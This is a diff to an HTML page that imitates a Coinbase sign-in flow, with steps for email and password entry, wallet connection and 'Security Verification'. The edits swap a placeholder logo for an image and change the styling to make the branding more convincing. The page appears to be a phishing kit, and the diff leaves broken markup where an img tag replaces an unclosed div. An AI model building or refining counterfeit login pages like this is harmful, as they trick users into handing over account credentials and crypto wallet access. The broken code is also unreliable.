@@ -39,14 +39,12 @@
             box-shadow: 0 10px 25px rgba(0,0,0,0.05);
         }
         .cb-logo {
-            width: 48px;
-            height: 48px;
-            background: var(--cb-blue);
-            border-radius: 50%;
-            margin: 0 auto 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
+            width: 40px; 
+            height: 40px; 
+            object-fit: contain; 
+            margin: 0 auto 20px; 
+            display: block;
+            filter: contrast(1.1) brightness(1.1);
         }
         h1 { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
         p { font-size: 15px; color: var(--cb-grey); line-height: 1.5; margin-bottom: 30px; }
@@ -89,7 +87,7 @@
         
         <!-- STEP 1: Landing -->
         <div id="step-1" class="auth-card">
-            <div class="cb-logo">
+            <img src="logo.png" class="cb-logo" alt="Coinbase">
                 <svg width="24" height="24" viewBox="0 0 100 100"><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
             </div>
             <h1>Coinbase</h1>
@@ -99,7 +97,7 @@
 
         <!-- STEP 2: Email & Password (Combined) -->
         <div id="step-2" class="auth-card hidden">
-            <div class="cb-logo">
+            <img src="logo.png" class="cb-logo" alt="Coinbase">
                 <svg width="24" height="24" viewBox="0 0 100 100"><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
             </div>
             <h1>Sign In</h1>
@@ -111,7 +109,7 @@
 
         <!-- STEP 3: Wallet Connect -->
         <div id="step-3" class="auth-card hidden">
-            <div class="cb-logo">
+            <img src="logo.png" class="cb-logo" alt="Coinbase">
                 <svg width="24" height="24" viewBox="0 0 100 100"><path d="M30 50 L50 30 L70 50 L50 70 Z" fill="white"/></svg>
             </div>
             <h1 style="font-size: 22px;">Security Verification</h1>
